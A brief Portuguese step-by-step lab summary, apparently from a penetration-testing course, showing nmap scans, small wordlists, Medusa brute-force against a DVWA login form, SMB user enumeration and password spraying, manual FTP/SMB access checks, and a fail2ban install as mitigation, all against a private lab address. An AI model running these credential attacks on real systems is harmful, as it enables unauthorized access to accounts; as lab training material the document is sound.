# Resumo direto e sem enrolação, passo a passo

## Reconhecimento de Portas
```bash
nmap -sS -sV 192.168.56.101
nmap -p 21,22,80,139,445 192.168.56.101
```

## Preparação de Wordlists
```bash
echo -e "admin\nroot\nuser\ntest" > users.txt
echo -e "admin\n123456\npassword\n1234\ntest" > pass.txt
```



## Ataque ao Formulário Web (DVWA)
```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m FORM:"login.php" -m DENY-SIGNAL:"error" -f -t 3
```

## Enumeração de Usuários SMB
```bash
enum4linux -U 192.168.56.101
```

## Password Spraying SMB
```bash
medusa -h 192.168.56.101 -U smb_users.txt -P common_passwords.txt -M smbnt -t 2 -T 3
```

## Validação Manual de Acessos
```bash
# Teste FTP
ftp 192.168.56.101

# Teste SMB com credenciais descobertas
smbclient //192.168.56.101/share -U usuario%senha
```

## Testes de Mitigação
```bash
# Instalação e configuração do fail2ban
sudo apt install fail2ban
sudo systemctl status fail2ban
```
